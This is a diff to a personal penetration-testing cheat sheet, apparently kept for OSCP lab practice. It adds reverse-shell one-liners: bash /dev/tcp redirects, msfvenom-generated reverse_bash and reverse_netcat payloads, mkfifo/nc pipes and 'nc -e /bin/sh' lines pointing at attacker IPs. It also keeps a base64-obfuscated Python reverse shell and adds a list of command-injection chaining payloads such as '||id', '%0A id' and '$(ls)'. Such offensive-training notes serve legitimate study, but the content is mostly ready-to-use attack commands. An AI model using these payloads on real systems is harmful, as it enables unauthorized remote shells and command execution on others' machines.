@@ -1,5 +1,8 @@
 # Links
 
+https://quickref.me/
+
+
 https://lzone.de/
 
 
@@ -144,7 +147,8 @@ for i in $(seq 1 65535); do nc -nvz -w 1 192.168.212.4 $i 2>&1; done | grep -v "
 
 ## open port outbound
 
-    #Top ports nmap -oG - -v --top-ports 10
+    # Top ports 
+    nmap -oG - -v --top-ports 10
     bttai@debian:~/OSCP/boxes/sickos$ cat ping.sh 
     ports="21 22 23 25 80 110 443 8080 8443"
     for port in $(seq 0 9000); do
@@ -778,6 +782,7 @@ find / -type f -name user.txt -exec cat {} \; 2> /dev/null
 
     # without netcat
     /bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
+    /bin/bash -i &> /dev/tcp/<attacker_ip>/<port> 0>&1
 
     # use  telnet
     mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
@@ -834,14 +839,19 @@ https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner
     msfvenom -p cmd/unix/reverse_python lhost=192.168.1.1 lport=443 R
     python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAgLCAgICBzdWJwcm9jZXNzICAgICAgICAsICAgIG9zICAgICA7ICAgIGhvc3Q9IjE5Mi4xNjguMS4xIiAgICAgOyAgICBwb3J0PTQ0MyAgICAgOyAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgICAgICAgICwgICAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICAgOyAgICBzLmNvbm5lY3QoKGhvc3QgICAgICAgICwgICAgcG9ydCkpICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgICAwKSAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgICAgMSkgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsICAgIDIpICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"
 
-    msfvenom -p cmd/unix/reverse_netcat lhost <attacker_ip> lpost <port> R
-    mkfifo /tmp/ffvdua; nc 192.168.0.13 443 0</tmp/ffvdua | /bin/sh >/tmp/ffvdua 2>&1; rm /tmp/ffvdua
     
-    msfvenom -p cmd/unix/reverse_bash lhost <attacker_ip> lpost <port> R
-    0<&21-;exec 21<>/dev/tcp/192.168.0.13/443;sh <&21 >&21 2>&21
+    msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash LHOST=192.168.110.1 LPORT=4444 R
+    bash -c '0<&128-;exec 128<>/dev/tcp/192.168.110.1/4444;sh <&128 >&128 2>&128'
+
     
-    msfvenom -p cmd/unix/reverse_netcat_gaping lhost=192.168.1.1 lport=443 R
-    nc 192.168.0.13 443 -e /bin/sh
+    msfvenom --platform unix -a cmd -p cmd/unix/reverse_netcat lhost=192.168.110.1 lport=4444 R
+    mkfifo /tmp/qgzh; nc 192.168.110.1 4444 0</tmp/qgzh | /bin/sh >/tmp/qgzh 2>&1; rm /tmp/qgzh
+
+
+    
+    msfvenom -a cmd --platform unix -p cmd/unix/reverse_netcat_gaping lhost=192.168.110.1 lport=443 R
+    nc 192.168.110.1 443 -e /bin/sh
+
 
     msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
     cmd/unix/bind_awk
@@ -1740,6 +1750,29 @@ print input11
     ; command ;
     ;; command ;;
     Test with basic commands : pwd, ls, netcat, ssh, wget, ping, traceroute, cat, nc, cd, touch, echo, rm, mv
+
+    #Both Unix and Windows supported
+
+
+
+    #Both Unix and Windows supported
+    ls||id; ls ||id; ls|| id; ls || id # Execute both
+    ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
+    ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
+    ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
+    ls %0A id # %0A Execute both (RECOMMENDED)
+
+    #Only unix supported
+    `ls` # ``
+    $(ls) # $()
+    ls; id # ; Chain commands
+
+    #Not execute but may be interesting
+    > /var/www/html/out.txt #Try to redirect the output to a file
+    < /etc/passwd #Try to send some input to the command
+
+
+
 
 # Buffers overflow
 
